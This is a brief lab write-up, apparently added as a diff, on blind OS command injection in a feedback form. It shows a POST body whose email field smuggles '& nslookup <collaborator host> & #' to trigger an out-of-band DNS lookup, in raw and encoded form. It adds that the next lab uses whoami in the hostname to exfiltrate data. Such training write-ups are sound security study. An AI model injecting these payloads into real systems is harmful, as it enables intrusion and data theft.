@@ -1,0 +1,13 @@
+In this lab just use burp collaborator exploit server url.
+
+use that url in gmail section in feedback form. the final payload will be like this
+
+csrf=7RuyfEaD2MgDeh2EulZB5lCqPSaoTpSU&name=saksham&email=sax%40gmail.com & nslookup 94byy3hh47ybywaw10jnjdd6oxuoie63.oastify.com & # &subject=xxx&message=hi
+
+after encode this is the payload
+
+csrf=7RuyfEaD2MgDeh2EulZB5lCqPSaoTpSU&name=saksham&email=sax%40gmail.com+%26+nslookup+94byy3hh47ybywaw10jnjdd6oxuoie63.oastify.com+%26+%23 &subject=xxx&message=hi
+
+
+The next lab is also same just now use whoami with url.
+
